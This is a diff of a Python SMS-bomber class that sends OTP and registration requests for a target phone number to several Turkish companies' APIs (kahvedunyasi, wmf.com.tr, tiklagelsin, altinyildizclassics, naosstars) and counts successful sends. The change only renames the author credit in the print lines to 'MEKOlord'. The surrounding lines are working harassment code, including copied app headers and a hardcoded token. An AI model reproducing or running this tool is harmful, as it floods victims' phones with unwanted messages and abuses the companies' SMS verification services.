@@ -28,7 +28,7 @@ class SendSms():
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}Made By yıldırımlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
+            print(f"{Fore.LIGHTRED_EX}Made By MEKOlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> core.kahvedunyasi.com")
         
      
     #wmf.com.tr
@@ -46,12 +46,12 @@ class SendSms():
                 "phone": f"0{self.phone}"
             })
             if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}Made By yıldırımlord | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}Made By MEKOlord | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                 self.adet += 1   
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By yıldırımlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+            print(f"{Fore.LIGHTRED_EX}Made By MEKOlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
     
      #tiklagelsin.com
     def TiklaGelsin(self):
@@ -61,12 +61,12 @@ class SendSms():
             json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
             r = requests.post(url, headers=headers, json=json)
             if r.json()["data"]["generateOtp"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By yıldırımlord | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By MEKOlord | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By yıldırımlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
+            print(f"{Fore.LIGHTRED_EX}Made By MEKOlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
     
 
     #ayyildiz.com.tr
@@ -76,12 +76,12 @@ class SendSms():
             headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
             r = requests.post(url, headers=headers)
             if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By yıldırımlord | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By MEKOlord | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By yıldırımlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")
+            print(f"{Fore.LIGHTRED_EX}Made By MEKOlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")
 
 
     #naosstars.com
@@ -92,12 +92,12 @@ class SendSms():
             json={"telephone": f"+90{self.phone}", "type": "register"}
             r = requests.post(url, headers=headers, json=json)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By yıldırımlord | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
+                print(f"{Fore.LIGHTGREEN_EX}Made By MEKOlord | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}Made By yıldırımlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")
+            print(f"{Fore.LIGHTRED_EX}Made By MEKOlord | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")
 
 
     #bim
